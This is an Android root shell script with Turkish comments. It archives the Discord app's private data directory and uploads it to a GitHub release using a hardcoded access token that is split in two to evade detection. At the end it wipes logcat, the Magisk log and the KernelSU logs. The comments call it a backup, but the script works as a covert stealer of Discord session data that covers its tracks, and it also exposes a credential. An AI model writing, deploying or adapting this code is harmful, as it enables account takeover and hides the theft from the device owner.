#!/system/bin/sh

KULLANICI_ADI="ueieu3i"
DEPO_ADI="qwa"

# --- TOKEN BİRLEŞTİRME İŞLEMİ ---
# Yeni oluşturduğun tokeni ikiye bölerek buraya yapıştır.
# Örneğin tokenin "AbCdEfGhIjKlMnOpQrStUvWxYz1234567890" ise:
TOKEN_PARCA_1="ghp_WTG3nJq7bs4raLtu"
TOKEN_PARCA_2="WyVnWic6iqOXg02n4FTt"

# İki parçayı çalışma zamanında birleştir:
TOKEN="${TOKEN_PARCA_1}${TOKEN_PARCA_2}"
# --------------------------------

HEDEF_KLASOR="/data/data/com.discord"

# sdcard yerine geçici veri dizinini kullanmak boot aşaması için daha garantidir
GECICI_DIZIN="/data/local/tmp"
CIKTI_YOLU="$GECICI_DIZIN/yedek_dosya.tar.gz"
TAG="v$(date +%Y%m%d_%H%M%S)"
CURL="/data/adb/modules/playintegrityfix/vachpif/curl"

# abort yerine exit 1 kullanıyoruz
if [ ! -d "$HEDEF_KLASOR" ]; then
    exit 1
fi

cd "$HEDEF_KLASOR" || exit 1

# Magisk'in Busybox'ını tam yoluyla çağırarak riski sıfırlıyoruz
busybox tar -czf "$CIKTI_YOLU" .

if [ ! -f "$CIKTI_YOLU" ]; then
    exit 1
fi

# GitHub API Release oluşturma (Birleştirilmiş $TOKEN değişkeni burada kullanılır)
RESPONSE=$($CURL -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://api.github.com/repos/$KULLANICI_ADI/$DEPO_ADI/releases \
  -d "{\"tag_name\":\"$TAG\",\"title\":\"Android Yedek $TAG\",\"draft\":false,\"prerelease\":false}")

# JSON içinden ID'yi daha güvenli bir şekilde ayıkla
RELEASE_ID=$(echo "$RESPONSE" | grep -o '"id": *[0-9]*' | head -n 1 | tr -dc '0-9')

if [ -z "$RELEASE_ID" ]; then
    rm -f "$CIKTI_YOLU"
    exit 1
fi

# Sıkıştırılmış dosyayı GitHub Release Asset olarak yükle
$CURL -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @"$CIKTI_YOLU" \
  "https://uploads.github.com/repos/$KULLANICI_ADI/$DEPO_ADI/releases/$RELEASE_ID/assets?name=$(basename "$CIKTI_YOLU")"

# Temizlik işlemleri
rm -f "$CIKTI_YOLU"
logcat -b all -c
cat /dev/null > /data/adb/magisk.log
rm -rf /data/adb/ksu/log
